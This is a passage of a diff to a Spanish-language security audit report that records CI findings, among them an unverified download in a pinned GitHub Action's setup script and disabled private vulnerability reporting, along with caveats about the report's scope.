+- CI-12: [setup.sh](https://github.com/subosito/flutter-action/blob/1a449444c387b1966244ae4d4f8c696479add0b2/setup.sh#L43-L48) descarga el archivo y el [action.yaml](https://github.com/subosito/flutter-action/blob/1a449444c387b1966244ae4d4f8c696479add0b2/action.yaml) de la acción fijada conserva referencias internas por tag. La variable sha256 del manifiesto se usa para componer una clave de caché, no como una comprobación del archivo descargado.
+- CI-3: `GET /repos/KaiCorpLabs/openward/private-vulnerability-reporting` devolvió `{"enabled":false}`. Es una observación fechada, no una garantía sobre el estado futuro del ajuste.
+- CI de referencia: [run de main 35ab7a6](https://github.com/KaiCorpLabs/openward/actions/runs/42900775281), con los 19 jobs terminados correctamente tras fusionar las actualizaciones de dependencias. Este resultado valida sus checks, no las PoCs de este informe. El estado de la CI del nuevo documento se conserva en los checks de la PR #8.
+
+Se han preservado las 63 entradas y sus subobservaciones; las agrupaciones informativas contienen cuestiones de distinto alcance y no equivalen a una vulnerabilidad única. Las correcciones de producto deberán verificarse con pruebas dirigidas cuando se implementen. La ausencia de una PoC nueva no cierra un caso pendiente.
